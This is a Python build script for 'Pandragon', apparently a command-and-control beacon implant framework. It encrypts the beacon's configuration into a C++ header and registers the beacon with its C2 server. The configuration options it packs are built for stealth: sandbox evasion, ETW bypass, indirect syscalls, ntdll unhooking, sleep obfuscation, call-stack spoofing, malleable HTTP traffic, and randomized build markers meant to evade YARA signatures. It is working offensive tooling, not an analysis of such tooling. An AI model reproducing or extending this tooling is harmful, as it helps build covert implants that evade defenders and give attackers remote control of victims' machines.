#!/usr/bin/env python3
"""
Pandragon Beacon Config Builder

Converts JSON beacon configuration to binary blob and generates C++ header.
Uses XChaCha20-Poly1305 for config encryption and authentication.

Usage:
    python config_builder.py Beacon/config/default.json

Outputs:
    - Beacon/config/include/generated_config.h  (C++ header with embedded blob)
    - Beacon/config/default.bin (raw binary blob)
"""

import json
import struct
import sys
import os
import hashlib
import secrets
from datetime import datetime
from pathlib import Path

# Import crypto from pycryptodome
# ChaCha20_Poly1305 supports XChaCha20 with 24-byte nonce
try:
    from Crypto.Cipher import ChaCha20_Poly1305
    from Crypto.Random import get_random_bytes
except ImportError:
    print("[!] Missing required dependency: pycryptodome")
    print("    pip install pycryptodome")
    sys.exit(1)

# Constants
PCFG_MAGIC = 0x50434647  # "PCFG" in little-endian
PCFG_VERSION = 0x0002  # Bumped to v2 for XChaCha20-Poly1305 encryption
CONFIG_NONCE_SIZE = 24  # XChaCha20 nonce size
CONFIG_MAC_SIZE = 16    # Poly1305 MAC size

# Post-build append magic (4 bytes, randomized per build to avoid YARA signatures)
# Format: [MAGIC:4][LEN:4 LE][DATA:N] appended to .exe after build


def derive_beacon_id(crypto_key_hex: str) -> str:
    """Derive beacon_id from crypto_key using SHA-256 (first 8 bytes as hex)"""
    crypto_key_bytes = bytes.fromhex(crypto_key_hex)
    return hashlib.sha256(crypto_key_bytes).hexdigest()[:16]


def validate_config(config: dict) -> bool:
    """Validate configuration against JSON schema"""
    # Auto-derive beacon_id from crypto_key if not present
    if 'crypto_key' in config and 'beacon_id' not in config:
        config['beacon_id'] = derive_beacon_id(config['crypto_key'])
        print(f"[*] Auto-derived beacon_id: {config['beacon_id']}")
    elif 'crypto_key' in config and 'beacon_id' in config:
        # Validate that provided beacon_id matches derived value
        expected_id = derive_beacon_id(config['crypto_key'])
        if config['beacon_id'] != expected_id:
            print(f"[!] beacon_id mismatch: expected {expected_id}, got {config['beacon_id']}")
            print(f"[!] Fix config or remove beacon_id to auto-derive")
            return False

    # Enforce JSON schema validation
    try:
        import jsonschema
    except ImportError:
        print("[!] Missing required dependency: jsonschema")
        print("    pip install jsonschema")
        return False

    schema_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "Beacon", "config", "schema.json")
    if not os.path.exists(schema_path):
        print(f"[!] Schema file not found: {schema_path}")
        return False

    with open(schema_path, 'r') as f:
        schema = json.load(f)

    try:
        jsonschema.validate(instance=config, schema=schema)
    except jsonschema.ValidationError as e:
        print(f"[!] Schema validation failed: {e.message}")
        return False
    except jsonschema.SchemaError as e:
        print(f"[!] Schema error: {e.message}")
        return False

    # Additional required field checks
    if 'c2_channels' not in config:
        print("[!] Missing required field: c2_channels")
        return False

    # Validate beacon_id if present (8 bytes = 16 hex chars)
    if 'beacon_id' in config:
        if len(config['beacon_id']) != 16:
            print(f"[!] beacon_id must be 16 hex characters (8 bytes)")
            return False

    # Validate crypto_key (32 bytes = 64 hex chars)
    if len(config['crypto_key']) != 64:
        print(f"[!] crypto_key must be 64 hex characters (32 bytes)")
        return False
    
    # Validate C2 channels (no upper limit)
    if not config['c2_channels']:
        print(f"[!] c2_channels must have at least 1 entry")
        return False

    # Validate lazy_checkin_max if lazy_checkin is enabled
    if config.get('lazy_checkin', False):
        if 'lazy_checkin_max' not in config:
            print("[!] lazy_checkin is true but lazy_checkin_max is not set")
            return False
        lazy_checkin_max = config['lazy_checkin_max']
        if not isinstance(lazy_checkin_max, int) or lazy_checkin_max < 1 or lazy_checkin_max > 255:
            print("[!] lazy_checkin_max must be an integer between 1 and 255")
            return False

    # Validate indirect_syscall_pivot if specified
    if 'indirect_syscall_pivot' in config:
        pivot = config['indirect_syscall_pivot']
        if not pivot:
            print("[!] indirect_syscall_pivot cannot be empty")
            return False
        if not pivot.startswith('Zw'):
            print("[!] indirect_syscall_pivot must start with 'Zw'")
            return False
        if pivot.startswith('Nt'):
            print("[!] 'Nt' functions are not allowed, use 'Zw' variant")
            return False

    # Warn about HTTP method / payload_location mismatch
    malleable = config.get('malleable_config', {})
    payload_loc = malleable.get('payload_location', {})
    if payload_loc.get('type') == 'query_param':
        for ch in config.get('c2_channels', []):
            if ch.get('http_method', 'GET') == 'POST':
                print("[!] WARNING: POST method with query_param payload_location is unusual")
                print("    Consider using GET for query_param or changing payload_location to 'body'")
                break  # Warn only once

    return True


def parse_iso_date(date_str: str) -> int:
    """Parse human-readable timestamp to Unix timestamp (UTC).

    Supported formats:
      - "YYYY-MM-DD"          -> midnight UTC
      - "YYYY-MM-DD HH:MM"    -> given time UTC
      - "YYYY-MM-DDTHH:MM:SS" -> ISO 8601 UTC
      - "YYYY-MM-DDTHH:MM:SSZ" -> ISO 8601 with explicit Z
    Returns 0 on parse failure.
    """
    if not date_str or not isinstance(date_str, str):
        return 0

    from datetime import timezone

    # Strip trailing Z for uniform parsing
    cleaned = date_str.strip()
    if cleaned.endswith('Z'):
        cleaned = cleaned[:-1]

    for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d"):
        try:
            dt = datetime.strptime(cleaned, fmt)
            dt = dt.replace(tzinfo=timezone.utc)
            return int(dt.timestamp())
        except ValueError:
            continue

    return 0


def build_c2_channel(channel: dict, config: dict = None) -> bytes:
    """Build binary C2 channel entry with failover configuration and malleable mode"""
    # Map channel type string to binary enum: HTTP=1, HTTPS=2, TCP=3, PIPE=4
    type_map = {'HTTP': 1, 'HTTPS': 2, 'TCP': 3, 'PIPE': 4}
    channel_type = type_map.get(channel['type'], 0)
    if channel_type == 0:
        raise ValueError(f"Unknown channel type: {channel['type']}")

    http_method = 1 if channel.get('http_method', 'GET') == 'POST' else 0  # 0=GET, 1=POST

    host = channel['host'].encode('utf-8')

    # PIPE channels: host = pipe name, path/ua empty
    # TCP channels: host is target, path/ua empty (ignored by transport)
    if channel_type in (3, 4):  # TCP or PIPE
        path = channel.get('path', '').encode('utf-8')
        ua = channel.get('user_agent', '').encode('utf-8')
    else:
        path = channel['path'].encode('utf-8')
        ua = channel['user_agent'].encode('utf-8')

    # Validate lengths (max 255 bytes each)
    if len(host) > 255 or len(path) > 255 or len(ua) > 255:
        raise ValueError("C2 channel strings must be <= 255 bytes")

    # Failover config is REQUIRED - no defaults
    if 'max_consecutive_failures' not in channel:
        raise ValueError("c2_channels[].max_consecutive_failures is required")
    if 'backoff_sleep_ms' not in channel:
        raise ValueError("c2_channels[].backoff_sleep_ms is required")

    max_failures = channel['max_consecutive_failures']
    backoff_ms = channel['backoff_sleep_ms']

    # Validate ranges
    if not (1 <= max_failures <= 100):
        raise ValueError("max_consecutive_failures must be 1-100")
    if not (1000 <= backoff_ms <= 300000):
        raise ValueError("backoff_sleep_ms must be 1000-300000")

    # Pack: type(1) + http_method(1) + host_len(1) + path_len(1) + ua_len(1) + reserved(1) + port(2) + max_failures(1) + backoff_ms(4) + host + path + ua
    data = struct.pack('<BBBBBBHB',
                       channel_type,
                       http_method,
                       len(host),
                       len(path),
                       len(ua),
                       0,  # reserved
                       channel['port'],
                       max_failures & 0xFF)  # Lower 8 bits
    data += struct.pack('<I', backoff_ms)  # Backoff sleep in ms
    data += host + path + ua

    # Determine malleable_mode
    if channel_type in (3, 4):  # TCP or PIPE -> no malleable
        malleable_mode = 0xFF
    elif 'malleable_config' in channel and channel['malleable_config']:
        # Per-channel malleable config present
        malleable_mode = 0x01
    else:
        # Use global malleable
        malleable_mode = 0x00

    # Append malleable_mode byte
    data += struct.pack('<B', malleable_mode)

    # If inline malleable, append the block
    if malleable_mode == 0x01:
        data += build_malleable_block(channel['malleable_config'])

    return data


def build_malleable_block(malleable: dict) -> bytes:
    """Build binary malleable config block (no flag byte; caller prepends mode)"""
    data = b''

    # Build wrapper section
    wrapper = malleable.get('wrapper', {})
    prefix = wrapper.get('prefix', '').encode('utf-8')[:65535]
    suffix = wrapper.get('suffix', '').encode('utf-8')[:65535]

    data += struct.pack('<H', len(prefix))
    data += prefix
    data += struct.pack('<H', len(suffix))
    data += suffix

    # Build HTTP headers section
    headers = malleable.get('http_headers', [])
    header_count = min(len(headers), 255)
    data += struct.pack('<B', header_count)

    for hdr in headers[:255]:
        # name and value are REQUIRED for each header
        if 'name' not in hdr or not hdr['name']:
            raise ValueError("http_headers[].name is required")
        if 'value' not in hdr:
            raise ValueError("http_headers[].value is required")
        name = hdr['name'].encode('utf-8')[:255]
        value = hdr['value'].encode('utf-8')[:1023]
        data += struct.pack('<B', len(name))
        data += struct.pack('<B', len(value))
        data += name
        data += value

    # Build payload location section
    location = malleable.get('payload_location', {})
    # type is REQUIRED for payload_location
    if 'type' not in location:
        raise ValueError("payload_location.type is required (query_param, path, or body)")
    
    loc_type = location['type']
    type_map = {'query_param': 0, 'path': 1, 'body': 2}
    if loc_type not in type_map:
        raise ValueError("payload_location.type must be query_param, path, or body")
    loc_type_val = type_map[loc_type]
    data += struct.pack('<B', loc_type_val)

    # Param name - REQUIRED for query_param type
    if loc_type == 'query_param':
        if 'param_name' not in location or not location['param_name']:
            raise ValueError("payload_location.param_name is required for query_param type")
        param_name = location['param_name'].encode('utf-8')[:63]
    else:
        param_name = location.get('param_name', '').encode('utf-8')[:63]
    data += struct.pack('<B', len(param_name))
    data += param_name

    # Path prefix - REQUIRED for path type
    if loc_type == 'path':
        if 'path_prefix' not in location or not location['path_prefix']:
            raise ValueError("payload_location.path_prefix is required for path type")
        path_prefix = location['path_prefix'].encode('utf-8')[:255]
    else:
        path_prefix = location.get('path_prefix', '').encode('utf-8')[:255]
    data += struct.pack('<B', len(path_prefix))
    data += path_prefix

    # Path suffix - REQUIRED for path type
    if loc_type == 'path':
        if 'path_suffix' not in location or not location['path_suffix']:
            raise ValueError("payload_location.path_suffix is required for path type")
        path_suffix = location['path_suffix'].encode('utf-8')[:63]
    else:
        path_suffix = location.get('path_suffix', '').encode('utf-8')[:63]
    data += struct.pack('<B', len(path_suffix))
    data += path_suffix

    # Body content type - ALWAYS written (default text/plain for non-body types)
    body_ct_map = {"text/plain": 0, "application/octet-stream": 1}
    body_ct = location.get('body_content_type', 'text/plain')
    if body_ct not in body_ct_map:
        body_ct = 'text/plain'
    data += struct.pack('<B', body_ct_map[body_ct])

    return data


def build_config_blob(config: dict) -> tuple:
    """
    Build complete config binary blob with XChaCha20-Poly1305 encryption.
    
    Returns: (blob, nonce, config_key)
    - blob: Complete encrypted config
    - nonce: 24-byte nonce for decryption
    - config_key: 32-byte key for decryption (separate from beacon crypto_key)
    """

    # Generate random 24-byte nonce for XChaCha20
    nonce = get_random_bytes(CONFIG_NONCE_SIZE)
    
    # Generate random 32-byte config encryption key
    # This is separate from the beacon crypto_key used for network comms
    config_key = get_random_bytes(32)

    # Parse beacon ID and crypto key from hex
    beacon_id = bytes.fromhex(config['beacon_id'])
    crypto_key = bytes.fromhex(config['crypto_key'])

    # Build C2 channels (with per-channel malleable)
    c2_data = b''
    for channel in config['c2_channels']:
        c2_data += build_c2_channel(channel, config)

    # REQUIRED: Parse sleep settings - no defaults
    if 'sleep_ms' not in config:
        raise ValueError("sleep_ms is required")
    if 'jitter_pct' not in config:
        raise ValueError("jitter_pct is required")
    
    sleep_ms = config['sleep_ms']
    jitter_pct = config['jitter_pct']
    
    # Validate ranges
    if not (100 <= sleep_ms <= 3600000):
        raise ValueError("sleep_ms must be 100-3600000")
    if not (0 <= jitter_pct <= 100):
        raise ValueError("jitter_pct must be 0-100")

    # Parse options (optional, defaults to 0)
    options = config.get('options', {})
    options_bitfield = 0
    if options.get('sandbox_evasion', False):
        options_bitfield |= 0x0001
    if options.get('debug_mode', False):
        options_bitfield |= 0x0002
    if 'kill_date' in config and config['kill_date']:
        kill_date = parse_iso_date(config['kill_date'])
        if kill_date:
            options_bitfield |= 0x0004  # Set kill_date_present flag
    # Bit 3: validate_ssl (1 = validate certs, 0 = ignore; for testing with self-signed)
    if options.get('validate_ssl', True):
        options_bitfield |= 0x0008
    # Bit 4: bypass_etw (1 = enable ETW bypass before checkin)
    if options.get('bypass_etw', False):
        options_bitfield |= 0x0010
    # Bit 5: use_indirect_syscalls (1 = enable indirect syscalls via HWBPs)
    if config.get('use_indirect_syscalls', False):
        options_bitfield |= 0x0020
    # Bit 6: lazy_checkin (1 = defer check-in to random poll)
    lazy_checkin = config.get('lazy_checkin', False)
    if lazy_checkin:
        options_bitfield |= 0x0040
    # Bit 7: lazy_unhook (unhook ntdll only before BOF execution)
    if config.get('lazy_unhook', False):
        options_bitfield |= 0x0080

    # Bits 8-9: sleep_obfuscation (0=none, 1=ekko, 2=foliage)
    sleep_obf = config.get('sleep_obfuscation', 'none')
    sleep_obf_map = {'none': 0, 'ekko': 1, 'foliage': 2}
    sleep_obf_val = sleep_obf_map.get(sleep_obf.lower(), 0)
    if sleep_obf_val:
        options_bitfield |= (sleep_obf_val & 0x03) << 8

    # Bit 10: sleep_wipe_pe_headers (zero PE headers during sleep)
    if config.get('sleep_wipe_pe_headers', False):
        options_bitfield |= 0x0400

    # Bit 11: sleep_stack_spoof (NT_TIB swap during ROP chain)
    if config.get('sleep_stack_spoof', False):
        options_bitfield |= 0x0800

    # Extract indirect_syscall_pivot (defaults to ZwSetDefaultLocale if empty)
    indirect_pivot = config.get('indirect_syscall_pivot', 'ZwSetDefaultLocale')
    if indirect_pivot:
        indirect_pivot_bytes = indirect_pivot.encode('ascii')
    else:
        indirect_pivot_bytes = b''

    # Bit 12: indirect_pivot_set (custom pivot API configured)
    if indirect_pivot:
        options_bitfield |= 0x1000

    # Parse kill date (optional)
    kill_date = 0
    if 'kill_date' in config and config['kill_date']:
        kill_date = parse_iso_date(config['kill_date'])
        # kill_date_present flag already set in options_bitfield above

    # Extract lazy_checkin_max for packing (validation done in validate_config())
    lazy_checkin_max = config.get('lazy_checkin_max', 0)

    # Build plaintext payload section
    plaintext = beacon_id  # 8 bytes
    plaintext += crypto_key  # 32 bytes
    plaintext += struct.pack('<B', len(config['c2_channels']))  # channel_count
    plaintext += c2_data  # Variable length C2 channels

    # Generate build-specific append magic (4 random bytes) for post-build append feature
    # This allows embedding unencrypted strings/IOCs in the binary without YARA signatures
    append_magic = get_random_bytes(4)
    plaintext += struct.pack('<I', sleep_ms)  # sleep_ms
    plaintext += struct.pack('<B', jitter_pct)  # jitter_pct
    plaintext += struct.pack('<I', kill_date)  # kill_date (unix timestamp)
    plaintext += struct.pack('<H', options_bitfield)  # options (2 bytes)
    plaintext += struct.pack('<B', lazy_checkin_max)  # lazy_checkin_max (1 byte)
    plaintext += struct.pack('<B', len(indirect_pivot_bytes))  # indirect_pivot_len (1 byte)
    plaintext += indirect_pivot_bytes  # indirect_pivot name (variable)

    # Read pad_max from config (default 1024 from default.json)
    pad_max = config.get('pad_max', 1024)
    plaintext += struct.pack('<H', pad_max)  # pad_max (2 bytes)

    # Read num_spoof_frames from config (default 6 if sleep_stack_spoof is enabled)
    num_spoof_frames = config.get('num_spoof_frames', 6 if config.get('sleep_stack_spoof', False) else 0)
    plaintext += struct.pack('<H', num_spoof_frames)  # num_spoof_frames (2 bytes)

    # Read max_response_size from config (default 64MB)
    max_response_size = config.get('max_response_size', 67108864)
    plaintext += struct.pack('<I', max_response_size)  # max_response_size (4 bytes)

    # Spawnto configuration: x64_len(1) + x64 + x86_len(1) + x86
    spawnto = config.get('spawnto', {})
    spawnto_x64 = spawnto.get('x64', 'C:\\Windows\\System32\\rundll32.exe')
    spawnto_x86 = spawnto.get('x86', 'C:\\Windows\\SysWOW64\\rundll32.exe')

    spawnto_x64_bytes = spawnto_x64.encode('utf-8')
    spawnto_x86_bytes = spawnto_x86.encode('utf-8')

    # Max 255 bytes each
    if len(spawnto_x64_bytes) > 255 or len(spawnto_x86_bytes) > 255:
        raise ValueError("spawnto paths must be <= 255 bytes")

    plaintext += struct.pack('<B', len(spawnto_x64_bytes))
    plaintext += spawnto_x64_bytes
    plaintext += struct.pack('<B', len(spawnto_x86_bytes))
    plaintext += spawnto_x86_bytes

    # Append global malleable config (with has_global_malleable flag)
    global_malleable = config.get('malleable_config', {})
    if global_malleable:
        plaintext += b'\x01'  # has_global_malleable = true
        plaintext += build_malleable_block(global_malleable)
    else:
        plaintext += b'\x00'  # has_global_malleable = false

    # Append work_hours config (6 bytes: enabled, start_hour, start_minute, end_hour, end_minute, insomnia)
    work_hours = config.get('work_hours', {})
    if work_hours:
        plaintext += struct.pack('<B', 1 if work_hours.get('enabled', False) else 0)  # enabled
        plaintext += struct.pack('<B', work_hours.get('start_hour', 9))   # start_hour
        plaintext += struct.pack('<B', work_hours.get('start_minute', 0))  # start_minute
        plaintext += struct.pack('<B', work_hours.get('end_hour', 17))   # end_hour
        plaintext += struct.pack('<B', work_hours.get('end_minute', 0))   # end_minute
        plaintext += struct.pack('<B', 1 if work_hours.get('insomnia', False) else 0)  # insomnia
    else:
        # Default: disabled
        plaintext += b'\x00\x09\x00\x11\x00\x00'  # enabled=0, 9:00-17:00, insomnia=0

    # Append stack spoof chain (count + per-entry module/function pairs)
    stack_chain = config.get('stack_spoof_chain', [])
    if not stack_chain:
        # Default chain: canonical thread startup returns
        stack_chain = [
            {'module': 'ntdll.dll', 'function': 'RtlUserThreadStart'},
            {'module': 'kernel32.dll', 'function': 'BaseThreadInitThunk'},
        ]
    if len(stack_chain) > 256:
        raise ValueError("stack_spoof_chain must have at most 256 entries")
    plaintext += struct.pack('<H', len(stack_chain))
    for entry in stack_chain:
        off = entry.get('offset', 0)
        if not isinstance(off, int) or off < 0 or off > 0xFFFFFFFF:
            raise ValueError("offset must be an integer between 0 and 0xFFFFFFFF")
        mod = entry['module'].encode('utf-8')
        fn  = entry['function'].encode('utf-8')
        if len(mod) > 255 or len(fn) > 255:
            raise ValueError("module and function names must be <= 255 bytes")
        plaintext += struct.pack('<I', off)
        plaintext += struct.pack('<B', len(mod)) + mod
        plaintext += struct.pack('<B', len(fn))  + fn

    # In-memory append strings (encrypted in config blob, available after decryption)
    # Format: count(1) + for each: len(2) + string
    im_append_strings = config.get('in_memory_append', {}).get('append', [])
    plaintext += struct.pack('<B', len(im_append_strings))
    for s in im_append_strings:
        if not isinstance(s, str):
            raise ValueError("in_memory_append.append items must be strings")
        s_bytes = s.encode('utf-8')
        if len(s_bytes) > 65535:
            raise ValueError("in_memory_append.append strings must be <= 65535 bytes")
        plaintext += struct.pack('<H', len(s_bytes)) + s_bytes

    # Build post-build append data from config (separate from encrypted config)
    # This creates unencrypted strings appended to the EXE after build
    append_strings = config.get('post_build', {}).get('append', [])
    append_data = b''
    for s in append_strings:
        if not isinstance(s, str):
            raise ValueError("post_build.append items must be strings")
        s_bytes = s.encode('utf-8')
        if len(s_bytes) > 65535:
            raise ValueError("post_build.append strings must be <= 65535 bytes")
        # Format: [MAGIC:4][LEN:4 LE][DATA:N]
        append_data += append_magic + struct.pack('<I', len(s_bytes)) + s_bytes

    # Encrypt payload with XChaCha20-Poly1305 (24-byte nonce)
    cipher = ChaCha20_Poly1305.new(key=config_key, nonce=nonce)
    cipher.update(b'')  # No associated data
    ciphertext, mac = cipher.encrypt_and_digest(plaintext)

    # Build header (unencrypted for beacon to identify and decrypt)
    # Header: magic(4) + version(2) + reserved(2) + nonce(24) + ciphertext_len(4) = 36 bytes
    header = struct.pack('<IHH',
                         PCFG_MAGIC,      # magic (4 bytes)
                         PCFG_VERSION,    # version (2 bytes)
                         0)               # reserved (2 bytes)
    header += nonce                       # 24 bytes
    header += struct.pack('<I', len(ciphertext))  # ciphertext length (4 bytes)

    # Complete blob: header + ciphertext + MAC
    blob = header + ciphertext + mac

    return blob, nonce, config_key, append_magic, append_data


def generate_cpp_header(blob: bytes, output_path: str, nonce: bytes, config_key: bytes, c2_channels: list, append_magic: bytes):
    """Generate C++ header with embedded encrypted config blob.

    Idempotent: only writes to disk if content actually changed, so Make
    doesn't trigger unnecessary recompiles.
    """

    # Format blob as C array
    hex_lines = []
    for i in range(0, len(blob), 16):
        chunk = blob[i:i+16]
        hex_str = ', '.join(f'0x{b:02X}' for b in chunk)
        hex_lines.append(f"    {hex_str}")

    blob_array = ',\n'.join(hex_lines)

    # Format nonce as C array
    nonce_array = ', '.join(f'0x{b:02X}' for b in nonce)

    # Format config key as C array
    key_array = ', '.join(f'0x{b:02X}' for b in config_key)

    # Format append magic as C array
    append_magic_array = ', '.join(f'0x{b:02X}' for b in append_magic)

    # Determine enabled transports
    enabled_transports = set()
    for ch in c2_channels:
        enabled_transports.add(ch['type'])

    transport_defines = ""
    for transport in ["HTTP", "HTTPS", "TCP", "PIPE"]:
        if transport in enabled_transports:
            transport_defines += f"#define PANDRAGON_ENABLE_{transport}\n"
        else:
            transport_defines += f"// #define PANDRAGON_ENABLE_{transport} // Disabled\n"

    cpp_header = f'''// AUTO-GENERATED CONFIG HEADER
// DO NOT EDIT - Generated by config_builder.py
//
// Security: Config encrypted with XChaCha20-Poly1305
// - Nonce: {CONFIG_NONCE_SIZE} bytes
// - Key: {len(config_key)} bytes
// - MAC: {CONFIG_MAC_SIZE} bytes (Poly1305)
// - Append Magic: 4 bytes (build-specific, for post-build append)

#pragma once

#include <cstdint>

// Enabled Transports
{transport_defines}

// Config blob magic and version
#define PCFG_MAGIC 0x50434647
#define PCFG_VERSION 0x0002  // XChaCha20-Poly1305 encrypted

// Encrypted config blob
constexpr uint8_t CONFIG_BLOB[] = {{
{blob_array}
}};

constexpr size_t CONFIG_BLOB_LEN = {len(blob)};

// XChaCha20-Poly1305 decryption key (32 bytes)
constexpr uint8_t CONFIG_DECRYPT_KEY[{len(config_key)}] = {{
    {key_array}
}};

// XChaCha20 nonce (24 bytes)
constexpr uint8_t CONFIG_NONCE[{CONFIG_NONCE_SIZE}] = {{
    {nonce_array}
}};

// Post-build append magic (4 bytes, build-specific)
// Use with tools/append_data.py to embed unencrypted strings/IOCs
constexpr uint8_t APPEND_MAGIC[4] = {{
    {append_magic_array}
}};

// Helper macro to get header
#define GET_CONFIG_HEADER() reinterpret_cast<const PCFG_Header*>(CONFIG_BLOB)
'''

    # Idempotent write: skip if content unchanged (prevents unnecessary rebuilds)
    if os.path.exists(output_path):
        with open(output_path, 'r') as f:
            existing = f.read()
        if existing == cpp_header:
            return  # No change; don't touch mtime

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'w') as f:
        f.write(cpp_header)
    print(f"[+] Generated C++ header: {output_path}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python config_builder.py <config.json> [output_dir]")
        sys.exit(1)

    config_path = sys.argv[1]
    output_dir = sys.argv[2] if len(sys.argv) > 2 else "Beacon/config"

    # Load config
    print(f"[*] Loading config: {config_path}")
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
    except Exception as e:
        print(f"[!] Failed to load config: {e}")
        sys.exit(1)

    # Auto-generate crypto key if missing
    if 'crypto_key' not in config:
        config['crypto_key'] = secrets.token_hex(32)
        print(f"[*] Auto-generated crypto_key: {config['crypto_key']}")

    # Auto-derive beacon_id from crypto_key if not present
    if 'beacon_id' not in config:
        config['beacon_id'] = derive_beacon_id(config['crypto_key'])
        print(f"[*] Auto-derived beacon_id: {config['beacon_id']}")

    # Validate config
    if not validate_config(config):
        print("[!] Config validation failed")
        sys.exit(1)

    print("[+] Config validation passed")

    # Build blob with XChaCha20-Poly1305 encryption
    blob, nonce, config_key, append_magic, append_data = build_config_blob(config)
    print(f"[+] Built config blob: {len(blob)} bytes")
    print(f"    Encryption: XChaCha20-Poly1305")
    print(f"    Nonce: {nonce.hex()}")
    print(f"    Config Key: {config_key.hex()}")
    print(f"    Append Magic: {append_magic.hex()}")

    # Generate output paths
    config_name = Path(config_path).stem

    # Output binary blob
    bin_output = os.path.join(output_dir, f"{config_name}.bin")
    with open(bin_output, 'wb') as f:
        f.write(blob)
    print(f"[+] Wrote binary blob: {bin_output}")

    # Write post-build append data file (for auto-append during make)
    if append_data:
        append_output = os.path.join(output_dir, f"{config_name}_append.bin")
        with open(append_output, 'wb') as f:
            f.write(append_data)
        print(f"[+] Wrote post-build append data: {append_output} ({len(append_data)} bytes, {len(config.get('post_build', {}).get('append', []))} strings)")

    # Generate C++ header with encryption key and nonce
    header_output = os.path.join(output_dir, "include", "generated_config.h")
    generate_cpp_header(blob, header_output, nonce, config_key, config['c2_channels'], append_magic)

    # Auto-sync beacon to server's known_beacons.json
    sync_beacon_to_server(config['beacon_id'], config['crypto_key'], config)

    # Print summary
    print("\n" + "=" * 50)
    print("CONFIG SUMMARY")
    print("=" * 50)
    print(f"Beacon ID:    {config['beacon_id']}")
    print(f"Sleep:        {config.get('sleep_ms', 5000)}ms (+{config.get('jitter_pct', 0)}% jitter)")
    print(f"C2 Channels:  {len(config['c2_channels'])}")
    for i, ch in enumerate(config['c2_channels']):
        http_method = ch.get('http_method', 'GET')
        print(f"  [{i}] {ch['type']} {ch['host']}:{ch['port']}{ch['path']} (HTTP: {http_method})")
    print(f"Options:      sandbox_evasion={config.get('options', {}).get('sandbox_evasion', False)}, debug={config.get('options', {}).get('debug_mode', False)}, bypass_etw={config.get('options', {}).get('bypass_etw', False)}, indirect_syscalls={config.get('use_indirect_syscalls', False)}, lazy_unhook={config.get('lazy_unhook', False)}")
    print(f"Sleep Obf:    {config.get('sleep_obfuscation', 'none')}, wipe_pe={config.get('sleep_wipe_pe_headers', False)}, stack_spoof={config.get('sleep_stack_spoof', False)}, spoof_frames={config.get('num_spoof_frames', 6)}")
    if config.get('kill_date'):
        print(f"Kill Date:    {config['kill_date']}")
    print(f"Lazy Checkin:  enabled={config.get('lazy_checkin', False)}, max_polls={config.get('lazy_checkin_max', 'N/A')}")

    spawnto = config.get('spawnto', {})
    if spawnto:
        print(f"Spawnto:      x64='{spawnto.get('x64', 'default')}' x86='{spawnto.get('x86', 'default')}'")

    # Print malleable config summary
    malleable = config.get('malleable_config', {})
    if malleable:
        print("\nMalleable Config:")
        wrapper = malleable.get('wrapper', {})
        if wrapper.get('prefix') or wrapper.get('suffix'):
            print(f"  Wrapper:    prefix='{wrapper.get('prefix', '')}' suffix='{wrapper.get('suffix', '')}'")
        headers = malleable.get('http_headers', [])
        if headers:
            print(f"  Headers:    {len(headers)} custom header(s)")
            for hdr in headers:
                print(f"              {hdr['name']}: {hdr['value']}")
        location = malleable.get('payload_location', {})
        if location:
            loc_type = location.get('type', 'query_param')
            print(f"  Location:   {loc_type}")
            if loc_type == 'query_param':
                print(f"              param_name: {location.get('param_name', '')}")
            elif loc_type == 'path':
                print(f"              path_prefix: {location.get('path_prefix', '')}")
                print(f"              path_suffix: {location.get('path_suffix', '')}")
    else:
        print("\nMalleable Config: None (default behavior)")

    # Print post-build append summary
    post_build = config.get('post_build', {})
    append_strings = post_build.get('append', [])
    if append_strings:
        print("\nPost-Build Append:")
        for i, s in enumerate(append_strings):
            print(f"  [{i}] {s!r} ({len(s)} bytes)")

    # Print in-memory append summary
    im_append = config.get('in_memory_append', {})
    im_append_strings = im_append.get('append', [])
    if im_append_strings:
        print("\nIn-Memory Append (encrypted in config blob):")
        for i, s in enumerate(im_append_strings):
            print(f"  [{i}] {s!r} ({len(s)} bytes)")

    print("=" * 50)

    print("\n[*] Build complete! Compile beacon with: make")


def sync_beacon_to_server(beacon_id: str, crypto_key: str, config: dict = None):
    """Sync beacon to server's known_beacons.json with its allowed routes.

    known_beacons.json tells the server which beacons are pre-registered,
    what routes they may use, and what malleable config each route uses.
    If a channel has its own malleable_config, it overrides the global one
    for that route.
    """
    server_file = "server/known_beacons.json"

    # Load existing or create fresh
    known = {"version": 2, "beacons": {}}
    if os.path.exists(server_file):
        try:
            with open(server_file, 'r') as f:
                known = json.load(f)
                if "beacons" not in known:
                    known["beacons"] = {}
        except (json.JSONDecodeError, OSError):
            print(f"[!] Warning: Could not read {server_file}, starting fresh")

    # Build allowed_routes from C2 channels
    allowed_routes = []
    for ch in config.get('c2_channels', []):
        # Determine effective malleable_config for this channel
        if ch.get('malleable_config'):
            mc = ch['malleable_config']
        elif config.get('malleable_config'):
            mc = config['malleable_config']
        else:
            mc = None

        ch_type = ch.get('type', 'HTTP')
        is_tcp = ch_type in ('TCP', 'PIPE')

        # Strip HTTP-only fields from malleable_config for TCP/PIPE
        if is_tcp and mc:
            # TCP can only use prefix/suffix wrappers, not HTTP headers
            wrapper = mc.get('wrapper')
            effective_mc = {'wrapper': wrapper} if wrapper else None
        else:
            effective_mc = mc

        route = {
            "transport_type": ch_type,
            "path": ch.get('path', ''),
            "port": ch.get('port', 0),
            "host": ch.get('host', ''),
            "user_agent": ch.get('user_agent', ''),
            "http_method": ch.get('http_method', 'GET'),
            "malleable_config": effective_mc,
        }
        allowed_routes.append(route)

    # Write/update this beacon's entry
    known["beacons"][beacon_id] = {
        "crypto_key": crypto_key,
        "allowed_routes": allowed_routes,
    }

    # Write atomically
    try:
        import tempfile
        fd, tmp_path = tempfile.mkstemp(dir=os.path.dirname(server_file) or '.')
        with os.fdopen(fd, 'w') as f:
            json.dump(known, f, indent=2)
        os.replace(tmp_path, server_file)
        print(f"[+] Synced beacon to server: {server_file}")
    except Exception as e:
        print(f"[!] Warning: Could not sync beacon to server: {e}")


if __name__ == "__main__":
    main()
